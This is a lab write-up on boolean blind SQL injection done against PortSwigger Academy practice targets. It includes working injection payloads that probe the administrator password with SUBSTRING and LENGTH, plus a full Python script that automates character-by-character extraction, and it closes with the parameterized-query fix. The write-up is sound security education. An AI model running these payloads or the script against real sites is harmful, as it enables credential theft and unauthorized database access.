# Blind SQL Injection — Extracting Data Through a One-Bit Channel

> **Educational writeup.** Done against deliberately vulnerable lab targets
> (PortSwigger Web Security Academy) in a controlled environment, to learn how
> the vulnerability class works and how to defend against it. No real or
> third-party systems were involved. No lab flags are reproduced here — this
> describes method and reasoning only.

## What makes it "blind"

In a normal SQL injection, the results of the injected query come straight back
in the page — you inject `UNION SELECT username, password ...` and the data
appears. **Blind** SQLi is when the injection works but the results are *never
displayed* and no error messages leak. You're extracting data without ever
being able to read it directly.

The trick: you don't read the data, you **ask yes/no questions** and infer each
character from how the application behaves.

## The target behaviour

The app used a tracking cookie in a SQL query. The results weren't shown, but the
page included a **"Welcome back"** message *if and only if* the query returned
any rows. That conditional message is the entire signal — a single bit of
information per request:

- `Welcome back` present  = condition TRUE
- `Welcome back` absent   = condition FALSE

Everything is built on top of that one bit.

## Step 1 — Confirm the injection and the signal

First, prove the yes/no channel works by injecting conditions that are trivially
true and false:

```
TrackingId=xyz' AND '1'='1     -> "Welcome back" appears  (TRUE)
TrackingId=xyz' AND '1'='2     -> "Welcome back" gone     (FALSE)
```

Note the trailing `'1` closes cleanly against the query's own closing quote, so
no comment is needed here. (For payloads that *don't* end in an open quote, you
need `-- -` to comment out the orphaned closing quote — see the gotcha below.)

## Step 2 — Ask questions about the password

With a working yes/no channel, I query the `administrator` password one character
at a time using `SUBSTRING`:

```
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'-- -
```

Reads as: "is the 1st character of the password 'a'?" If `Welcome back` appears,
yes. Otherwise try `'b'`, `'c'`, ... then move to position 2 (`,2,1`), and so on.

First I found the length by walking a threshold until the signal flipped:

```
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>20-- -
```

`>20` was the point where "Welcome back" disappeared → the password is 20
characters.

## Step 3 — Automate it

20 characters × up to ~36 possibilities each is hundreds of requests — nobody
does that by hand. This is where scripting becomes essential (the web equivalent
of using `pwntools` for binary exploitation). The script asks each yes/no
question and rebuilds the password:

```python
import requests
import string

URL = "https://<LAB-ID>.web-security-academy.net/"   # placeholder
SESSION = "<SESSION_COOKIE>"                          # placeholder
TRACKING_BASE = "<TRACKING_ID>"                       # placeholder

charset = string.digits + string.ascii_lowercase
password = ""

s = requests.Session()   # reuse one TLS connection (see gotcha below)

for position in range(1, 21):
    found = False
    for char in charset:
        payload = (
            f"{TRACKING_BASE}' AND "
            f"SUBSTRING((SELECT password FROM users "
            f"WHERE username='administrator'),{position},1)='{char}'-- -"
        )
        cookies = {"TrackingId": payload, "session": SESSION}

        # retry on flaky connections instead of crashing the whole run
        for _ in range(3):
            try:
                r = s.get(URL, cookies=cookies, timeout=15)
                break
            except Exception:
                s = requests.Session()
        else:
            continue

        if "Welcome back" in r.text:
            password += char
            print(f"pos {position}: {char}  ->  {password}")
            found = True
            break

    if not found:
        print(f"pos {position}: nothing found (charset too narrow?)")
        break

print(f"\nPassword: {password}")
```

## Gotchas I hit (the actual learning)

- **The orphaned quote.** A payload ending in `>20` or `='a'` (not an open quote)
  leaves the query's own closing `'` dangling → SQL syntax error → the signal
  never fires, no matter how correct the logic is. Fix: end every payload with
  `-- -` (note the trailing space, which is what actually makes `--` a comment)
  to comment out whatever follows. Making `-- -` a reflex kills this whole class
  of failure.

- **The password started with a digit.** Testing only `a-z` found nothing on
  position 1 and looked like the whole thing was broken. It wasn't — the first
  character was `9`. The charset has to match reality. A quick sanity test with
  `!= 'X'` (which should return TRUE) confirmed the mechanism worked and the
  problem was just a too-narrow charset. If the target had symbols or uppercase,
  the charset would need to widen (at the cost of more requests), or switch to an
  ASCII binary-search which covers everything *and* is faster (~7 requests per
  character instead of ~36).

- **Connection stalls / TLS handshake failures.** Firing hundreds of brand-new
  connections in a burst triggered rate-limiting and hanging handshakes. Two
  fixes: `requests.Session()` to reuse a single connection (one handshake instead
  of hundreds), and a `timeout` so a slow request fails fast instead of hanging
  forever. Without the timeout, the script just froze mid-run.

## Boolean vs. time-based

This target leaked a *conditional response* ("Welcome back"). When an app leaks
**no** visible difference at all, the same idea still works using **time** as the
signal: inject "if the condition is true, sleep 10 seconds", and measure how long
the response takes. Slow = true, fast = false. Same one-bit-per-question
extraction, different side channel.

## The fix

The root cause is the same as every injection bug: **user input is treated as
code** (here, SQL) instead of data. The fix is **parameterized queries /
prepared statements**, which separate the query structure from the user-supplied
values so the input can never change the query's meaning:

```python
# vulnerable: input becomes part of the SQL text
cursor.execute("SELECT * FROM tracking WHERE id = '" + tracking_id + "'")

# safe: input is bound as a parameter, never parsed as SQL
cursor.execute("SELECT * FROM tracking WHERE id = %s", (tracking_id,))
```

It's the same principle as `printf("%s", x)` vs `printf(x)`, or HTML-escaping in
XSS: never let data cross the boundary into code.
